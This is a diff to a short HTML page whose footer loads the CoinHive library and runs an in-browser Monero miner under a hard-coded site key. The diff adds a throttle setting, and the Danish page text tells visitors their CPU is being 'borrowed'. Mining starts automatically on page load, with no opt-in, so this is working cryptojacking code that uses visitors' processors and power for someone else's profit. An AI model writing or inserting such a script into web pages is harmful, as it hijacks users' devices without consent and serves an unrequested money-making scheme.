@@ -1,15 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
 <header>
 </header>
 <body>
 	<div>
 		<p>Vi miner lige nu Monero i din browser.</p>
-		<p>Tak for lån af din CPU!</p>
+		<p>Tak for lån af 20% af din CPU!</p>
+	</div>
+	<div>
+
 	</div>
 </body>
 <footer>
 	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 	<script>
-	var miner = new CoinHive.Anonymous('IUAhiHrUWkxEMtIpsV7U23kwm1R1Gwyf');
+	var miner = new CoinHive.Anonymous('IUAhiHrUWkxEMtIpsV7U23kwm1R1Gwyf',{throttle: 0.8})
 	miner.start();
 </script>
 </footer>	
